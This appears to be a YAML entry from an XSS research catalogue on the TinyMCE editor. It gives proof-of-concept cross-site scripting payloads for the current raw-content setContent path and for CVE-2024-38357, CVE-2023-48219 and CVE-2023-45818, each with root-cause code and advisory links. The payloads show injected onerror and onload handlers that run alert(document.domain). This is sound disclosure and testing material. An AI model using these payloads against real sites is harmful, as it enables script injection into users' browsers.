---
description: The world's \#1 JavaScript library for rich text editing. Available for React, Vue and Angular.
github: tinymce/tinymce
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: |
          In case `format: raw` is used with `editor.setContent` the content is not sanitized. Otherwise, it uses DOMPurify.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/tinymce/7.9.1/tinymce.min.js"></script>
          <script>
            tinymce.init({
              selector: "#editor",
              plugins: "media",
              toolbar: "undo redo | bold italic | alignleft aligncenter alignright | media",
              menubar: false,
              setup: function (editor) {
                editor.on("init", function () {
                  // user input
                  editor.setContent("<img src=x onerror=alert(document.domain)>", {format: "raw"});
                });
              }
            });
          </script>

          <textarea id="editor" name="content"></textarea>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/tinymce/tinymce/blob/b7a0e50b920961aac4d29619f721a4f915221df1/modules/tinymce/src/core/main/ts/content/SetContentImpl.ts#L66">https://github.com/tinymce/tinymce/blob/b7a0e50b920961aac4d29619f721a4f915221df1/modules/tinymce/src/core/main/ts/content/SetContentImpl.ts#L66</a>

      ```javascript
      const setContentString = (editor: Editor, body: HTMLElement, content: string, args: SetContentArgs): SetContentResult => {
        // [...]

        } else {
          if (args.format !== 'raw') {
            content = HtmlSerializer({ validate: false }, editor.schema).serialize(
              editor.parser.parse(content, { isRootContent: true, insert: true })
            );
          }

          const trimmedHtml = isWsPreserveElement(SugarElement.fromDom(body)) ? content : Tools.trim(content);
          setEditorHtml(editor, trimmedHtml, args.no_selection);

          return { content: trimmedHtml, html: trimmedHtml };
        }
      };
      ```
    links:
      - https://www.tiny.cloud/docs/tinymce/latest/apis/tinymce.editor/#setContent
  ≤6.8.3&≤7.1.2:
    cve: CVE-2024-38357
    authors:
      - github:Malav-MK
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - noscript-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: The [tinymce](https://github.com/tinymce/tinymce) editor was was HTML entity decoding `<noscript>` content.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/tinymce/7.1.2/tinymce.min.js"></script>
          <script>
            tinymce.init({
            selector: "#editor",
            plugins: "media",
            toolbar: "undo redo | bold italic | alignleft aligncenter alignright | media",
            menubar: false,
            setup: function (editor) {
              editor.on("init", function () {
                // user input
                editor.setContent("<noscript>&lt;/noscript&gt;&lt;style onload=alert(document.domain)&gt;&lt;/style&gt;</noscript>");
              });
            }
            });
          </script>

          <textarea id="editor" name="content"></textarea>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/tinymce/tinymce/blob/f59e49f83b66262c5e6cc3b53e5258047eb56f4f/modules/tinymce/src/core/main/ts/dom/DomSerializerFilters.ts#L86">https://github.com/tinymce/tinymce/blob/f59e49f83b66262c5e6cc3b53e5258047eb56f4f/modules/tinymce/src/core/main/ts/dom/DomSerializerFilters.ts#L86</a>

      ```javascript
        htmlParser.addNodeFilter('noscript', (nodes) => {
          let i = nodes.length;
          while (i--) {
            const node = nodes[i].firstChild;

            if (node) {
              node.value = Entities.decode(node.value ?? '');
            }
          }
        });
      ```
    links:
      - https://github.com/tinymce/tinymce/commit/a9fb858509f86dacfa8b01cfd34653b408983ac0
      - https://github.com/tinymce/tinymce/security/advisories/GHSA-w9jx-4g6g-rp7x
  ≤5.10.8&≤6.7.2:
    cve: CVE-2023-48219
    authors:
      - twitter:kinugawamasato
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - noscript-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: The [tinymce](https://github.com/tinymce/tinymce) editor was replacing characters to `null` after the HTML sanitization. For this to work, the undo button has to be pressed.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/tinymce/6.7.2/tinymce.min.js"></script>
          <script>
            tinymce.init({
              selector: "#editor",
              plugins: "media",
              toolbar: "undo redo | bold italic | alignleft aligncenter alignright | media",
              menubar: false,
            });
          </script>

          <!-- user input -->
          <!--<noscript><[U+FEFF]/noscript><[U+FEFF]iframe onload=alert(document.domain)></noscript>-->
          <textarea id="editor">
            <noscript><﻿/noscript><﻿iframe onload=alert(document.domain)></noscript>
            <h1>Steps to reproduce</h1>
            1. Enter random text in this editor area<br/>
            2. Undo -> XSS
          </textarea>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/tinymce/tinymce/blob/403c51d35c21b1cde13ec4f3c58e0fd976e816a1/modules/tinymce/src/core/main/ts/dom/TrimBody.ts#L36-L46">https://github.com/tinymce/tinymce/blob/403c51d35c21b1cde13ec4f3c58e0fd976e816a1/modules/tinymce/src/core/main/ts/dom/TrimBody.ts#L36-L46</a>

      ```javascript
      const removeCommentsContainingZwsp = (body: HTMLElement): void => {
        const walker = createCommentWalker(body);
        let nextNode = walker.nextNode();
        while (nextNode !== null) {
          const comment = walker.currentNode as Comment;
          nextNode = walker.nextNode();
          if (Type.isString(comment.nodeValue) && comment.nodeValue.includes(Zwsp.ZWSP)) {
            Remove.remove(SugarElement.fromDom(comment));
          }
        }
      };
      ```
    links:
      - https://vulnerabledoma.in/tinymce/CVE-2023-48219.html
      - https://www.tiny.cloud/docs/tinymce/5/release-notes5109/
  ≤5.10.7&≤6.7.0:
    cve: CVE-2023-45818
    authors:
      - twitter:kinugawamasato
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - comment-tag
      - noscript-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: The [tinymce](https://github.com/tinymce/tinymce) editor was replacing characters to `null` after the HTML sanitization. For this to work, the undo button has to be pressed.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/tinymce/6.7.0/tinymce.min.js"></script>
          <script>
            tinymce.init({
              selector: "#editor",
              plugins: "media",
              toolbar: "undo redo | bold italic | alignleft aligncenter alignright | media",
              menubar: false,
            });
          </script>

          <!-- user input -->
          <textarea id="editor">
            <!--data-mce-selected="x"-><iframe onload=alert(document.domain)>-->
            <h1>Steps to reproduce</h1>
            1. Enter random text in this editor area<br/>
            2. Undo -> XSS
          </textarea>
      - code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/tinymce/6.7.0/tinymce.min.js"></script>
          <script>
            tinymce.init({
              selector: "#editor",
              plugins: "media",
              toolbar: "undo redo | bold italic | alignleft aligncenter alignright | media",
              menubar: false,
            });
          </script>

          <!-- user input -->
          <textarea id="editor">
            <!--<br data-mce-bogus="all">-><iframe onload=alert(document.domain)>-->
            <h1>Steps to reproduce</h1>
            1. Enter random text in this editor area<br/>
            2. Undo -> XSS
          </textarea>
      - code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/tinymce/6.7.0/tinymce.min.js"></script>
          <script>
            tinymce.init({
              selector: "#editor",
              plugins: "media",
              toolbar: "undo redo | bold italic | alignleft aligncenter alignright | media",
              menubar: false,
            });
          </script>

          <!-- user input -->
          <!--[U+FEFF]-><iframe onload=alert(document.domain)>-->
          <textarea id="editor">
            <!--﻿-><iframe onload=alert(document.domain)>-->
            <h1>Steps to reproduce</h1>
            1. Enter random text in this editor area<br/>
            2. Undo -> XSS
          </textarea>
    more-info: |
      **Root Cause (PoC #1)**

      Source: <a target="_blank" href="https://github.com/tinymce/tinymce/blob/79fae0b5868a52bfe2303d237326f7fcf5bdf739/modules/tinymce/src/core/main/ts/dom/TrimHtml.ts#L86">https://github.com/tinymce/tinymce/blob/79fae0b5868a52bfe2303d237326f7fcf5bdf739/modules/tinymce/src/core/main/ts/dom/TrimHtml.ts#L86</a>

      ```javascript
      const trimHtml = (tempAttrs: string[], html: string): string => {
        const trimContentRegExp = new RegExp([
          '\\s?(' + tempAttrs.join('|') + ')="[^"]+"' // Trim temporary data-mce prefixed attributes like data-mce-selected
        ].join('|'), 'gi');

        return html.replace(trimContentRegExp, '');
      };
      ```

      **Root Cause (PoC #2)**

      Source: <a target="_blank" href="https://github.com/tinymce/tinymce/blob/79fae0b5868a52bfe2303d237326f7fcf5bdf739/modules/tinymce/src/core/main/ts/dom/TrimHtml.ts#L109">https://github.com/tinymce/tinymce/blob/79fae0b5868a52bfe2303d237326f7fcf5bdf739/modules/tinymce/src/core/main/ts/dom/TrimHtml.ts#L109</a>

      ```javascript
      const trimInternal = (serializer: DomSerializer, html: string): string => {
        // [...]

        while ((matches = bogusAllRegExp.exec(content))) {
          // [...]

          content = content.substring(0, index - matchLength) + content.substring(endTagIndex);
          bogusAllRegExp.lastIndex = index - matchLength;
        }

        // [...]
      };
      ```

      **Root Cause (PoC #3)**

      Source: <a target="_blank" href="https://github.com/tinymce/tinymce/blob/79fae0b5868a52bfe2303d237326f7fcf5bdf739/modules/tinymce/src/core/main/ts/dom/TrimHtml.ts#L113">https://github.com/tinymce/tinymce/blob/79fae0b5868a52bfe2303d237326f7fcf5bdf739/modules/tinymce/src/core/main/ts/dom/TrimHtml.ts#L113</a>

      ```javascript
      const trimInternal = (serializer: DomSerializer, html: string): string => {
        // [...]

        return Zwsp.trim(content);
      };
      ```
    links:
      - https://vulnerabledoma.in/tinymce/CVE-2023-45818.html
      - https://www.tiny.cloud/docs/tinymce/6/6.7.1-release-notes/#security-fixes
      - https://www.tiny.cloud/docs/tinymce/5/release-notes5108/#securityfixes
---
